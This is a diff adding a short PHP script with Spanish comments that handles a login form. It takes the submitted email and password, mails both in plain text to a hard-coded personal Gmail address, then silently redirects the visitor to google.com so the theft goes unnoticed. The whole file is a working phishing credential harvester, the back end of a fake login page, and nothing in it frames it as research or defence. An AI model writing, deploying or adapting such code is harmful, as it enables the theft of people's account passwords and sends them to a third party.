@@ -1,0 +1,19 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $correo = $_POST["correo"];
+    $contrasena = $_POST["contrasena"];
+
+    // Aquí puedes agregar código para enviar un correo electrónico a andreytamayo80@gmail.com
+    // Usualmente, se utiliza la función mail() de PHP para enviar correos, pero asegúrate de configurar tu servidor correctamente.
+
+    $destinatario = "andreytamayo80@gmail.com";
+    $asunto = "Nuevo inicio de sesión";
+    $mensaje = "Correo: $correo\nContraseña: $contrasena";
+
+    mail($destinatario, $asunto, $mensaje);
+
+    // Redirige al usuario a Google.com después de enviar el formulario
+    header("Location: https://www.google.com");
+    exit();
+}
+?>
